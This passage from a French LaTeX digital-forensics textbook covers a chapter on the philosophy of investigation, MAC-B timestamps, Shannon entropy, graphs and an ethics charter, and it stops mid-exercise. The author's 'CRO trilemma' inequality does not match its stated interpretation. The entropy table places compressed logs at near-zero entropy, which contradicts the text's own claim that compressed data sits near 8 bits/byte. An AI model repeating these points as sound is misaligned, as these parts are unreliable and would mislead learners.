Cameroun depuis 1984).

\smallskip
(a)~Comment l'investigateur aurait-il dû anticiper ce problème avant
la capture~?\\
(b)~Comment le gérer dans son rapport pour préserver à la fois
$\mathcal{O}$ et $\mathcal{C}$~?\\
(c)~Existe-t-il une solution technique qui aurait permis de réduire
la surface de collecte~?
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{La suite du cours.} Ce prologue vous a donné les réflexes de base
et la tension fondamentale (Trilemme CRO) qui donne sens à toutes les
techniques. La \textbf{Partie~I} (Chapitres~1--5) apporte la philosophie
et l'histoire qui ancrent ces réflexes dans leur contexte intellectuel.
La \textbf{Partie~II} (Chapitres~6--9) formalise le Processus Investigatif
Universel, la chaîne de custody et les outils d'acquisition. La
\textbf{Partie~IV} (Chapitres~14--20) vous entraîne sur des systèmes réels
--- Windows, réseau, mobile, cloud --- avec les cas qui traversent ce cours.
\end{boxinfo}

    
    % ======================================================================
    % PARTIE I — FONDEMENTS ÉPISTÉMOLOGIQUES ET HISTORIQUES
    % Standards de référence : DFRWS, NIST SP 800-86 §2, Casey 2004
    % Niveau : fondamental
    % ======================================================================
    \part{Fondements Épistémologiques et Historiques}
    \label{part:fondements}

        % ============================================================================
% Fichier  : partie1/P01_C01_philosophie_fondements.tex
% Titre    : Philosophie et Fondements de l'Investigation Numérique
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
%
% Sources fusionnées :
%   - 0_philosophie_fondements.tex (version précédente)
%   - chap2.pdf (archéologie foucaldienne des régimes de vérité)
%   - minka2025cro (Trilemme CRO, ePrint 2025/1348)
%   - minka2025zknr (paradoxe de l'authenticité invisible, ePrint 2025/1138)
% ============================================================================

\chapter{Philosophie et Fondements de l'Investigation Numérique}
\label{chap:phi-fond}

\epigraph{%
    « L'archéologie ne cherche pas à retrouver la continuité ininterrompue~;
    elle établit ce qu'il nous est possible de connaître. »%
}{--- Michel Foucault, \textit{L'Archéologie du savoir}, 1969}

\niveauChapitre{Fondamental}{%
    Aucun prérequis. Ce chapitre articule philosophie, épistémologie et
    mathématiques à un niveau accessible. Les équations servent à préciser
    des intuitions, non à les remplacer.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Caractériser l'investigation numérique comme pratique philosophique
          à part entière, distincte d'une simple maîtrise d'outils.
    \item Comprendre la notion foucaldienne de \termecle{régime de vérité
          numérique} et l'appliquer à la périodisation de la discipline.
    \item Maîtriser les fondements mathématiques mobilisés en forensique~:
          entropie de Shannon, théorie des graphes, sensibilité aux
          conditions initiales.
    \item Articuler le \termecle{paradoxe de l'authenticité invisible}
          avec le Trilemme CRO comme grille de lecture unifiée.
    \item Formuler les obligations éthiques de l'investigateur numérique
          à partir de la notion de \termecle{praxis de liberté}.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section{L'Investigation Numérique comme Pratique Discursive}
% ============================================================================

\subsection{Au-delà de la technique : une discipline philosophique}

L'investigation numérique est souvent présentée comme une affaire d'outils~:
Autopsy pour analyser les disques, Volatility pour la mémoire, Wireshark pour
le réseau. Cette réduction est non seulement inexacte -- elle est dangereuse.
Un investigateur réduit à ses outils est un artisan. Ce cours forme des
praticiens capables de produire des conclusions défendables devant n'importe
quel tribunal, dans n'importe quel contexte, avec les outils disponibles au
moment de l'investigation. Cela exige une \textbf{théorie}, pas seulement
une boîte à outils.

\medskip

La théorie commence ici, avec une question que Foucault aurait reconnue~:
\textit{qu'est-ce qui fait qu'un énoncé numérique compte comme preuve à
une époque donnée ?} Cette question n'est pas rhétorique. La réponse a changé
quatre fois depuis 1970, et elle changera encore. L'investigateur qui ne
comprend pas ces changements travaille dans l'obscurité~; celui qui les
comprend peut anticiper les défis de l'audience avant même de toucher
le premier disque dur.

\begin{boxdef}
\textbf{Investigation numérique}\index{investigation numérique} (\textit{Digital forensics}) ---
Discipline scientifique appliquée ayant pour objet l'identification,
la préservation, l'analyse et la présentation de preuves numériques en
respectant des méthodes juridiquement admissibles. Elle mobilise
simultanément l'informatique, le droit, les mathématiques et la philosophie
de la connaissance.
\end{boxdef}

\subsection{La notion foucaldienne de régime de vérité numérique}

Notre cadre d'analyse s'inspire de \textit{L'Archéologie du savoir} de
Foucault \cite{foucault1969} pour analyser l'investigation numérique comme
\termecle{pratique discursive} productrice de vérité. Chaque période
historique correspond à un \textbf{régime de vérité numérique} différent~:
un système qui détermine a priori ce qui peut compter comme preuve légitime,
quelles méthodes d'investigation sont autorisées, quelles institutions sont
habilitées à certifier la vérité numérique, et quel statut épistémique est
accordé à l'investigateur.

\begin{boxdef}
\textbf{Régime de vérité numérique}\index{régime de vérité numérique} --- Système
historiquement situé qui détermine, de manière a priori~: les types de
traces considérées comme preuves légitimes~; les techniques d'investigation
autorisées~; les institutions habilitées à certifier~; les conditions
d'acceptabilité juridique et sociale~; et le statut épistémique de
l'investigateur comme sujet de savoir.
\end{boxdef}

Cette notion est plus qu'un exercice académique. Elle explique pourquoi
certaines preuves irréfutables sur le plan technique restent irrecevables
sur le plan juridique~: elles appartiennent à un régime de vérité que le
droit n'a pas encore assimilé. Elle explique aussi pourquoi un investigateur
formé uniquement sur les outils actuels sera dépassé dans dix ans, tandis
que celui qui comprend la logique des régimes pourra s'adapter.

\subsection{Périodisation mathématique des régimes}

La périodisation des régimes de vérité repose sur quatre axes d'analyse
dont la dominance relative définit chaque époque. Pour toute période
historique $t$, le régime est caractérisé par un \textbf{vecteur de
dominance} \cite{minka2025cro}~:

\begin{equation}
\vec{R}_t = \bigl(\alpha_T,\; \alpha_J,\; \alpha_S,\; \alpha_P\bigr)
\quad \text{avec} \quad \sum_{i} \alpha_i = 1
\label{eq:vecteur-regime}
\end{equation}

où $\alpha_T$ représente la dominance technologique, $\alpha_J$ la
dominance juridique et normative, $\alpha_S$ la dominance sociale et
culturelle, et $\alpha_P$ la dominance des pratiques professionnelles.
La transition d'un régime $\vec{R}_t$ à son successeur $\vec{R}_{t+1}$
obéit à une équation de transition non linéaire~:

\begin{equation}
\vec{R}_{t+1} = F\bigl(\vec{R}_t,\; \Delta\mathrm{Tech}_t,\;
\Delta\mathrm{Legal}_t,\; \mathcal{I}_t\bigr)
\label{eq:transition}
\end{equation}

où $\mathcal{I}_t$ représente l'ensemble des incidents critiques de la
période $t$ -- les affaires qui ont contraint le régime à se reconfigurer.

\bigskip

Le tableau suivant synthétise l'évolution des régimes depuis l'émergence
de la discipline \cite{chap2pdf}~:

\begin{tableaucours}{p{2.0cm}p{2.8cm}p{3.2cm}p{3.4cm}}{%
    \tableauHeader{Période} &
    \tableauHeader{Régime dominant} &
    \tableauHeader{Preuve paradigmatique} &
    \tableauHeader{Autorité épistémique}
}
1970--1990 & Technique $(\alpha_T \approx 0.7)$ & Log système, adresse IP &
    Expert technique isolé \\
1990--2000 & Juridique $(\alpha_J \approx 0.5)$ & Chaîne de custody & Tribunal \\
2000--2010 & Standardisé $(\alpha_P \approx 0.5)$ & Conformité ISO/IEC & Organisme
    de certification \\
2010--2020 & Computationnel $(\alpha_T \approx 0.6)$ & Analyse big data &
    Algorithme \\
2020--\ldots & Quantique / ZK & Preuve à divulgation nulle &
    \sigle{IA} / Protocole \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}
{\small\itshape Tableau~1.1 --- Évolution des régimes de vérité numérique
(d'après \cite{chap2pdf} et \cite{minka2025cro})}
\end{center}

% ============================================================================
\section{Ontologie de la Trace Numérique}
% ============================================================================

\subsection{La trace comme phénomène existentiel}

Dans la philosophie de Derrida, la \textit{trace} est l'inscription d'une
absence~: quelque chose était là, a agi, et a laissé une marque. La
\termecle{trace numérique}\index{trace numérique} est une instanciation
particulièrement pure de cette notion~: elle est produite sans intention
consciente de laisser une marque, elle persiste au-delà de l'action qui
l'a générée, et elle peut être interprétée comme révélatrice d'intention
\emph{a posteriori}.

\medskip

La trace numérique n'est pas une simple donnée~; elle est une
\textbf{manifestation d'existence}. Chaque fichier créé, chaque connexion
établie, chaque frappe de clavier enregistrée dans un journal est la
matérialisation numérique d'un acte humain. L'investigateur qui lit ces
traces ne lit pas de la technique~: il lit du comportement, de l'intention,
de la relation. Cette lecture est herméneutique avant d'être technique.

\begin{boiteRemarque}{Herméneutique des données}
L'interprétation des traces numériques requiert ce que Gadamer appelle
un \textit{cercle herméneutique}~: on ne comprend une trace qu'à la lumière
du contexte global, et on ne comprend le contexte global qu'à la lumière
des traces individuelles. En pratique~: un fichier \texttt{.docx} nommé
\texttt{faux\_bon\_de\_commande.docx} n'a de signification forensique que
replacé dans la chronologie des virements, l'historique de navigation et
les échanges d'emails. Chaque artefact éclaire les autres.
\end{boiteRemarque}

\subsection{Temporalité numérique multidimensionnelle}

Le temps numérique n'est pas linéaire. Un fichier possède jusqu'à quatre
horodatages distincts dans le système de fichiers NTFS~:
\textbf{M}odified, \textbf{A}ccessed, \textbf{C}hanged, \textbf{B}orn
(horodatage de création). Ces quatre dimensions peuvent diverger de
façon significative~: un fichier créé en 2020, modifié en 2024, mais
accédé pour la dernière fois en 2022 raconte une histoire non linéaire.
L'investigateur doit maîtriser cette \textbf{temporalité
plurielle}\index{temporalité numérique} pour ne pas
commettre d'erreurs d'interprétation.

\begin{tableaucours}{p{2.2cm}p{3.8cm}p{5.2cm}}{%
    \tableauHeader{Horodatage} &
    \tableauHeader{Signification} &
    \tableauHeader{Remarque forensique}
}
\texttt{Modified} & Dernière modification du contenu & Le plus couramment
    analysé~; peut être falsifié (\textit{timestomping}) \\
\texttt{Accessed} & Dernier accès en lecture & Peu fiable~: Windows désactive
    souvent la mise à jour pour des raisons de performance \\
\texttt{Changed} & Dernière modification des métadonnées & Révèle les
    opérations sur l'entrée MFT~; difficile à falsifier \\
\texttt{Born} & Date de création sur ce volume & Clé pour détecter les
    fichiers copiés (Born > Modified = copié depuis un autre volume) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}
{\small\itshape Tableau~1.2 --- Les quatre horodatages NTFS (timestamps MAC-B)
et leur interprétation forensique}
\end{center}

La comparaison entre la preuve traditionnelle et la preuve numérique révèle
l'ampleur de cette transformation ontologique~:

\begin{tableaucours}{p{5.5cm}p{5.5cm}}{%
    \tableauHeader{Preuve traditionnelle} &
    \tableauHeader{Preuve numérique}
}
Matérialité tangible, physique & Immatérialité des bits \\
Stabilité physique dans le temps & Volatilité et mutabilité \\
Authenticité portée par l'objet & Authenticité par la chaîne de confiance \\
Temporalité linéaire, univoque & Temporalité multidimensionnelle (MAC-B) \\
Falsification visible à l'expert & Falsification indétectable sans hachage \\
Localité géographique claire & Dispersion cloud multi-juridictionnelle \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}
{\small\itshape Tableau~1.3 --- Transition ontologique de la preuve~:
du physique au numérique}
\end{center}

% ============================================================================
\section{Épistémologie de la Preuve Numérique}
% ============================================================================

\subsection{La crise de la vérité numérique}

L'ère numérique engendre une \textbf{crise de la vérité} sans précédent.
Trois phénomènes convergents l'alimentent~:

\begin{itemize}
    \item \textbf{Manipulation algorithmique~:} les \textit{deepfakes}, les
          documents générés par intelligence artificielle, les voix synthétiques
          brouillent la frontière entre l'authentique et le fabriqué avec une
          précision qui dépasse la capacité de détection humaine non assistée.

    \item \textbf{Érosion de l'autorité épistémique~:} la multiplication des
          sources d'information, la désintermédiation des médias et la
          fragmentation des espaces discursifs ont détruit le consensus sur
          ce qui constitue une source fiable.

    \item \textbf{Fragmentation du réel~:} les mêmes événements peuvent être
          documentés par des enregistrements contradictoires, tous authentiques,
          correspondant à des points de vue partiels sur une réalité complexe.
\end{itemize}

L'investigateur numérique devient dans ce contexte un
\textbf{archiviste du réel}\index{archiviste du réel}~: celui dont le rôle
est de préserver l'intégrité de la mémoire collective contre l'effacement,
la falsification et la réécriture. Ce rôle dépasse largement le cadre
judiciaire~; il touche à la démocratie, à la justice et à l'histoire.

\subsection{La théorie de Kuhn appliquée à la forensique}

Thomas Kuhn, dans \textit{La Structure des révolutions scientifiques}
\cite{kuhn1962}, a montré que les sciences ne progressent pas par accumulation
continue mais par ruptures paradigmatiques. La forensique numérique illustre
parfaitement ce modèle~: chaque décennie depuis 1970 a correspondu à un
changement de paradigme, pas à une simple amélioration.

\medskip

Le paradigme \textbf{technique} (1970--1990) posait que la vérité numérique
était une affaire d'experts isolés lisant des logs. Le paradigme
\textbf{juridique} (1990--2000) a introduit la chaîne de custody et fait
du tribunal l'arbitre final. Le paradigme \textbf{standardisé} (2000--2010)
a délégué cette autorité aux organismes de certification (\sigle{ISO/IEC}).
Le paradigme \textbf{computationnel} (2010--2020) a transféré l'autorité
aux algorithmes d'analyse massive. Le paradigme \textbf{quantique/ZK}
(2020--\ldots) en cours de formation pose que la vérité numérique peut et
doit être prouvée sans divulgation de contenu.

\medskip

Chaque transition a rendu caduques des pans entiers de la pratique
existante. Un investigateur formé uniquement dans le paradigme standardisé
-- maîtrisant parfaitement les procédures ISO~27037 -- n'est pas
naturellement préparé à travailler avec des preuves à divulgation nulle.
C'est pourquoi ce cours enseigne les \emph{fondements}, pas les procédures~:
les fondements survivent aux changements de paradigme.

% ============================================================================
\section{Fondements Mathématiques de la Discipline}
% ============================================================================

Les mathématiques de l'investigation numérique ne sont pas décoratives~:
elles fournissent des outils opérationnels utilisés quotidiennement.
Trois théories fondent la discipline.

\subsection{Théorie de l'information : l'entropie de Shannon}
\label{subsec:shannon}

La théorie de l'information de Shannon \cite{shannon1948} quantifie
l'incertitude contenue dans un système d'information. Son concept central,
l'\termecle{entropie informationnelle}\index{entropie de Shannon}, est
défini par~:

\begin{equation}
H(X) = -\sum_{i=1}^{n} P(x_i) \log_2 P(x_i)
\label{eq:shannon}
\end{equation}

où $X$ est une variable aléatoire prenant les valeurs $x_1, \ldots, x_n$
avec les probabilités $P(x_1), \ldots, P(x_n)$, et $H(X)$ est mesurée
en bits. Cette équation a trois applications forensiques directes~:

\begin{enumerate}
    \item \textbf{Détection de données chiffrées ou compressées~:}
          un fichier chiffré ou compressé présente une entropie proche de~8
          bits/octet (distribution quasi uniforme des octets). Un fichier texte
          ordinaire présente une entropie de~3 à~5 bits/octet. Un examinateur
          peut ainsi identifier rapidement les zones d'un disque contenant
          des données potentiellement chiffrées.

    \item \textbf{Détection de stéganographie~:} l'insertion de données cachées
          dans un fichier image ou audio modifie la distribution statistique
          des pixels ou des échantillons, entraînant une divergence entropique
          mesurable par rapport à un fichier non modifié de même type.

    \item \textbf{Analyse de malware~:} les sections de code d'un exécutable
          malveillant chiffré (shellcode chiffré, packer) présentent une
          entropie anormalement haute, ce qui permet de les identifier avant
          même d'exécuter le binaire.
\end{enumerate}

\begin{boxartefact}{Entropie d'un fichier -- indicateur forensique}
\textbf{Interprétation pratique de l'entropie~:}\\[0.5ex]
\begin{tabular}{p{3cm}p{7.5cm}}
$H \in [0, 1]$ & Fichier quasi vide ou très répétitif (logs compressés, fichiers
    sparse) \\
$H \in [3, 5]$ & Texte naturel, code source, XML/JSON non compressé \\
$H \in [6, 7]$ & Données binaires compilées, exécutables standard \\
$H \in [7.5, 8]$ & Chiffrement, compression, stéganographie -- investigation
    approfondie recommandée \\
\end{tabular}
\end{boxartefact}

\subsection{Théorie des graphes : modélisation des relations}

L'analyse relationnelle repose sur la \termecle{théorie des graphes},
qui modélise les entités et leurs interactions~:

\begin{equation}
G = (V, E) \quad \text{avec} \quad E \subseteq V \times V
\label{eq:graphe}
\end{equation}

où $V$ est l'ensemble des \textit{sommets} (entités~: personnes, machines,
comptes, adresses IP) et $E$ l'ensemble des \textit{arêtes} (relations~:
communications, transferts, accès). Un graphe pondéré $G = (V, E, w)$ où
$w : E \to \mathbb{R}$ associe un poids à chaque relation (volume de
communications, fréquence, montants transférés) est particulièrement
utile en investigation financière.

\medskip

Les applications forensiques sont nombreuses~:

\begin{itemize}
    \item \textbf{Analyse de réseau de communication~:} les échanges d'emails
          ou de messages forment un graphe dont les algorithmes de centralité
          (PageRank, betweenness centrality) permettent d'identifier les
          acteurs clés d'un réseau criminel.
    \item \textbf{Corrélation d'incidents~:} les logs de plusieurs systèmes
          peuvent être modélisés comme un graphe temporel pour reconstituer
          un chemin d'attaque.
    \item \textbf{Forensique blockchain~:} les transactions
          cryptomonnaies forment un graphe de flux dont l'analyse permet
          de remonter des fonds jusqu'à des entités identifiables.
\end{itemize}

\subsection{Sensibilité aux conditions initiales}

L'investigation numérique opère dans des systèmes complexes où de minuscules
altérations peuvent avoir des conséquences considérables. Cela est formalisé
par la théorie du chaos~: pour un système dynamique, la distance entre
deux trajectoires initialement proches croît exponentiellement~:

\begin{equation}
\delta(t) \approx \delta(0) \cdot e^{\lambda t}
\label{eq:lyapunov}
\end{equation}

où $\lambda$ est l'exposant de Lyapunov caractérisant la sensibilité du
système. En forensique, ce résultat justifie mathématiquement l'obsession
pour la préservation de l'intégrité~: une modification infinitésimale de
l'état initial (allumer le PC, monter une partition) peut produire
une divergence massive dans l'état final (modification de centaines
d'horodatages, création de fichiers temporaires, mise à jour du registre).
La sensibilité aux conditions initiales est la justification théorique
profonde du principe d'\textbf{intégrité}.

% ============================================================================
\section{Le Paradoxe de l'Authenticité Invisible}
% ============================================================================

\subsection{Énoncé du paradoxe}

Le \termecle{paradoxe de l'authenticité invisible}\index{paradoxe de
l'authenticité invisible} -- théorisé dans \cite{minka2025zknr} -- capture
la tension fondamentale entre authentification et confidentialité~:

\begin{quotation}
\textit{Plus une preuve numérique est authentique et vérifiable, plus elle
tend à révéler des informations sur son contenu et son origine, compromettant
ainsi la confidentialité. Inversement, plus une preuve préserve la
confidentialité, plus son authenticité devient difficile à établir de
manière certaine.}
\end{quotation}

Cette tension peut s'exprimer comme une relation d'incertitude analogue
au principe d'Heisenberg~:

\begin{equation}
\Delta\mathcal{A} \cdot \Delta\mathcal{C} \;\geq\; \hbar_{\mathrm{num}}
\label{eq:authenticite-invisible}
\end{equation}

où $\Delta\mathcal{A}$ est l'incertitude sur l'authenticité (fiabilité de
la preuve), $\Delta\mathcal{C}$ est l'incertitude sur la confidentialité
(protection de l'information), et $\hbar_{\mathrm{num}}$ est une constante
numérique fondamentale caractérisant le système considéré.

\begin{boiteRemarque}{Statut de la formule~\eqref{eq:authenticite-invisible}}
Cette relation d'incertitude est une \emph{analogie formalisée}, pas une
dérivation de la mécanique quantique. Sa valeur est heuristique~: elle
nomme une tension réelle et irréductible, lui donne une forme mathématique
précise, et ouvre la voie à des mesures opérationnelles. La constante
$\hbar_{\mathrm{num}}$ dépend du système cryptographique et du contexte
juridique~; sa quantification précise est l'objet de travaux en cours
au LIMSI.
\end{boiteRemarque}

\subsection{Implications épistémologiques}

Le paradoxe soulève trois questions profondes que l'investigateur doit
intégrer dans sa pratique~:

\begin{enumerate}
    \item \textbf{Peut-on savoir qu'une preuve est authentique sans
          en connaître le contenu~?} Les preuves à divulgation nulle
          (protocoles ZK) répondent oui -- à condition d'accepter que
          la preuve change de nature~: elle n'est plus un objet à examiner
          mais un processus à vérifier.

    \item \textbf{Comment fonder la confiance dans ce qui reste invisible~?}
          La réponse est institutionnelle autant que technique~: la confiance
          repose sur la robustesse mathématique du protocole ET sur la
          légitimité de l'institution qui le met en œuvre.

    \item \textbf{L'authenticité peut-elle exister sous forme chiffrée~?}
          Oui~: un hash cryptographique prouve l'intégrité d'un fichier
          sans en révéler le contenu. Mais l'opposabilité juridique de
          cette preuve reste dépendante de la juridiction.
\end{enumerate}

\subsection{Résolution partielle : les protocoles ZK-NR}

Les protocoles \termecle{Zero-Knowledge Non-Repudiation} (ZK-NR)
\cite{minka2025zknr} apportent une résolution pratique en permettant~:

\[
\text{Vérification} \quad \text{sans} \quad \text{Divulgation}
\]
\[
\text{Confiance} \quad \text{sans} \quad \text{Transparence totale}
\]
\[
\text{Preuve} \quad \text{sans} \quad \text{Révélation du contenu}
\]

Cette résolution n'est pas magique~: elle ne supprime pas la tension
du paradoxe, elle en gère les effets de façon contrôlée. La Partie~VI
de ce cours (Chapitres~25--31) est entièrement consacrée à ces protocoles.
Le paradoxe de l'authenticité invisible sera alors revisité dans toute
sa profondeur mathématique.

% ============================================================================
\section{Le Trilemme CRO comme Grille de Lecture Unifiée}
% ============================================================================

\subsection{Genèse et formalisation}

Les tensions identifiées dans les sections précédentes -- entre
authentification et confidentialité, entre opposabilité et protection de
la vie privée, entre rigueur technique et admissibilité juridique -- ne
sont pas des accidents. Elles constituent la structure profonde de toute
investigation numérique, formalisée par le \termecle{Trilemme CRO}
\cite{minka2025cro}.

\begin{boxCRO}
\textbf{Le Trilemme CRO --- Définition formelle}

\medskip
Soit $\Pi$ un protocole ou une méthode d'investigation numérique. On définit~:
\begin{itemize}
    \item $\mathcal{C}(\Pi) \in [0,1]$~: indice de confidentialité ---
          mesure dans quelle proportion $\Pi$ protège les informations
          sensibles des parties impliquées.
    \item $\mathcal{R}(\Pi) \in [0,1]$~: indice de fiabilité ---
          mesure dans quelle proportion $\Pi$ garantit l'intégrité et
          la reproductibilité des preuves.
    \item $\mathcal{O}(\Pi) \in [0,1]$~: indice d'opposabilité juridique ---
          mesure dans quelle proportion $\Pi$ produit des preuves
          recevables et défendables devant un tribunal.
\end{itemize}

\textbf{Énoncé du trilemme \cite{minka2025cro}~:}
\begin{equation}
\Gamma_{CRO}(\Pi) \;=\; \max\bigl\{\mathcal{C}(\Pi),\;
\mathcal{R}(\Pi),\; \mathcal{O}(\Pi)\bigr\}
\;\geq\; 0.4 + \mathrm{negl}(\lambda)
\label{eq:CRO}
\end{equation}

où $\lambda$ est le paramètre de sécurité du système cryptographique sous-jacent
et $\mathrm{negl}(\lambda)$ une fonction négligeable.

\medskip
\textit{Interprétation~: aucun protocole ne peut simultanément maximiser
les trois indices. Au moins l'une des trois dimensions sera contrainte à
demeurer sous son maximum théorique. La compétence de l'investigateur
se mesure précisément à sa capacité à choisir et justifier
le compromis optimal pour le contexte.}
\end{boxCRO}

\subsection{Le Trilemme comme boussole de la pratique}

À chaque étape d'une investigation, l'analyste du Trilemme CRO pose
trois questions~:

\begin{enumerate}
    \item \textbf{Cette technique augmente-t-elle $\mathcal{C}$, $\mathcal{R}$
          ou $\mathcal{O}$ ?} Si elle augmente $\mathcal{R}$ (ex.~: capture
          RAM complète), quelle dimension sacrifie-t-elle ?
          ($\mathcal{C}$~: accès à des données personnelles non pertinentes).

    \item \textbf{Le compromis est-il justifiable et documenté~?} Un
          compromis non documenté n'est pas défendable. Un compromis documenté
          et justifié est presque toujours défendable.

    \item \textbf{Ce compromis est-il proportionnel à l'enjeu~?} Une
          investigation pour un détournement de 500~000~FCFA ne justifie
          pas la même atteinte à $\mathcal{C}$ qu'une investigation pour
          une affaire de terrorisme.
\end{enumerate}

Le Trilemme CRO n'est pas une contrainte abstraite~: c'est l'outil qui
transforme chaque décision technique en décision éthique consciente. Il
sera appliqué systématiquement à chaque chapitre de ce cours, sous la
forme de l'encadré \textbf{Analyse~CRO}.

% ============================================================================
\section{Éthique et Responsabilité de l'Investigateur}
% ============================================================================

\subsection{L'investigateur comme philosophe-praticien}

L'investigateur numérique moderne endosse ce que Ricoeur appellerait
une \textbf{identité narrative composite}~: il est simultanément~:

\begin{enumerate}
    \item \textbf{Archéologue du digital~:} il exhume et préserve les traces
          numériques comme un archéologue préserverait des vestiges -- avec
          la conscience que toute intervention modifie irréversiblement ce
          qu'on tente de conserver.

    \item \textbf{Épistémologue pratique~:} il évalue en permanence la
          fiabilité de ce qu'il trouve, distingue la corrélation de la
          causalité, et refuse de conclure au-delà de ce que les preuves
          permettent.

    \item \textbf{Éthicien appliqué~:} il navigue des dilemmes moraux réels,
          souvent sans temps de réflexion, et doit avoir internalisé des
          principes suffisamment robustes pour guider ses choix dans l'urgence.
\end{enumerate}

\subsection{L'investigation comme praxis de liberté}

Bien comprise, l'investigation numérique est une \termecle{praxis de
liberté}\index{praxis de liberté}~: elle protège les individus contre
l'arbitraire en documentant le réel~; elle permet la reddition des comptes
dans des sociétés où le pouvoir numérique est concentré~; elle préserve
la mémoire collective contre l'effacement délibéré~; elle équilibre des
rapports de force asymétriques par la transparence.

\medskip

Cette dimension politique et éthique n'est pas extérieure à la technique~:
elle lui donne son sens. C'est pourquoi ce cours insiste autant sur les
conditions juridiques d'admissibilité que sur les commandes forensiques~:
une preuve obtenue illégalement ou de façon disproportionnée n'est pas
seulement irrecevable -- elle est une atteinte aux droits fondamentaux.

\begin{boxdef}
\textbf{Charte de l'investigateur numérique}\index{charte de l'investigateur}
--- Ensemble des obligations éthiques fondamentales~:

\begin{enumerate}
    \item Je préserverai l'intégrité de la preuve avant toute autre
          considération, y compris celle d'efficacité.
    \item Je respecterai la dignité numérique des personnes impliquées,
          qu'elles soient suspectes, victimes ou témoins.
    \item Je reconnaîtrai les limites de ma connaissance et les documenterai
          dans mes rapports.
    \item Je travaillerai pour la vérité, pas pour la conviction d'une
          partie -- ma loyauté est envers le tribunal, pas envers
          le commanditaire.
    \item Je me souviendrai que derrière chaque donnée se trouve un humain
          dont la vie peut être affectée par mes conclusions.
\end{enumerate}
\end{boxdef}

\subsection{Vers une éthique post-quantique}

L'avènement de la cryptographie post-quantique et des preuves à divulgation
nulle soulève de nouveaux impératifs éthiques que la pratique actuelle
n'a pas encore intégrés. Trois enjeux majeurs~:

\begin{itemize}
    \item \textbf{La résistance à l'obsolescence~:} les preuves numériques
          collectées aujourd'hui avec des algorithmes cryptographiques
          classiques (RSA, ECDSA) seront potentiellement cassables dans dix
          à quinze ans par un ordinateur quantique suffisant. L'investigateur
          a-t-il une obligation de collecter dès maintenant avec des
          algorithmes post-quantiques~? La réponse est oui, pour les
          affaires à haute valeur ou longue durée.

    \item \textbf{Le droit à l'oubli dans un monde de mémoire parfaite~:}
          les capacités croissantes de stockage et de traitement permettent
          de conserver et d'analyser des traces numériques sur des décennies.
          L'investigateur doit intégrer le principe de proportionnalité
          temporelle~: la durée de conservation des preuves collectées doit
          être proportionnelle à l'enjeu judiciaire.

    \item \textbf{La responsabilité des algorithmes~:} quand un outil d'IA
          identifie un suspect ou classe un artefact, qui est responsable
          de cette conclusion~? L'investigateur ne peut pas déléguer
          sa responsabilité épistémique à un algorithme opaque.
\end{itemize}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}

\begin{itemize}
    \item L'investigation numérique est une \textbf{pratique discursive}
          au sens foucaldien~: chaque époque définit ses propres critères
          de vérité numérique. Comprendre ces régimes permet d'anticiper
          les défis judiciaires à venir.

    \item Le \textbf{vecteur de dominance} $\vec{R}_t = (\alpha_T, \alpha_J,
          \alpha_S, \alpha_P)$ formalise mathématiquement le régime de vérité
          dominant à chaque période.

    \item La \textbf{trace numérique} est une manifestation d'existence~:
          sa lecture est herméneutique avant d'être technique. La temporalité
          numérique est multidimensionnelle (horodatages MAC-B).

    \item Trois outils mathématiques fondent la discipline~:
          \textbf{entropie de Shannon} (détection d'anomalies),
          \textbf{théorie des graphes} (analyse relationnelle),
          \textbf{sensibilité aux conditions initiales} (justification
          du principe d'intégrité).

    \item Le \textbf{paradoxe de l'authenticité invisible}
          ($\Delta\mathcal{A} \cdot \Delta\mathcal{C} \geq \hbar_{\mathrm{num}}$)
          nomme la tension irréductible entre authentification et
          confidentialité. Les protocoles ZK-NR en gèrent les effets,
          sans la supprimer.

    \item Le \textbf{Trilemme CRO} ($\Gamma_{CRO}(\Pi) \geq 0.4 +
          \mathrm{negl}(\lambda)$) est la grille d'analyse qui traverse
          tout ce cours~: toute investigation est un compromis explicite
          entre Confidentialité, Fiabilité et Opposabilité.

    \item L'investigateur est un \textbf{philosophe-praticien}~: sa
          responsabilité est envers la vérité et la justice, pas envers
          la conviction d'une partie. La Charte de l'investigateur
          traduit cette responsabilité en obligations concrètes.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~1.1 --- Diagnostic de régime \niveaubase}]
Identifiez le régime de vérité numérique dominant (1970--1990,
1990--2000, 2000--2010, 2010--2020 ou 2020--\ldots) pour chacun des
scénarios suivants, en justifiant votre réponse par les caractéristiques
du régime (preuve paradigmatique, autorité épistémique, vecteur dominant)~:

\begin{enumerate}[(a)]
    \item Un juge rejette une preuve numérique au motif qu'elle a été
          collectée sans protocole de hachage documenté.
    \item Un investigateur présente au tribunal une analyse de clustering
          automatique de 2~millions d'emails, sans pouvoir expliquer
          précisément comment l'algorithme a identifié les messages suspects.
    \item Une entreprise engage un consultant qui, à partir de logs système,
          reconstitue manuellement l'activité d'un intrus et rédige
          un rapport non structuré mais techniquement exact.
    \item Une unité spécialisée utilise une preuve à divulgation nulle
          pour prouver qu'un document a été modifié, sans révéler son contenu.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~1.2 --- Application du Trilemme CRO \niveaumoyen}]
Pour chacune des situations suivantes, calculez qualitativement les trois
indices CRO (\textit{faible / moyen / élevé}), identifiez le compromis
réalisé et évaluez s'il est justifiable~:

\begin{enumerate}[(a)]
    \item Un investigateur capture l'intégralité du trafic réseau d'une
          entreprise pendant 72~heures pour analyser une fuite de données.
    \item Un OPJ exige du prestataire cloud qu'il livre les données chiffrées
          d'un suspect sans lui fournir la clé de déchiffrement.
    \item Un analyste publie ses outils d'investigation en open source pour
          garantir la reproductibilité de ses méthodes.
    \item Une juridiction autorise l'utilisation d'une analyse IA pour
          classer les messages comme ``suspects'' mais interdit à l'avocat
          de la défense d'accéder à l'algorithme utilisé.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~1.3 --- Réflexion sur l'entropie \niveauexpert}]
Vous analysez une image forensique d'un disque dur de 500~Go. L'outil
d'analyse d'entropie détecte une zone de 47~Go présentant une entropie
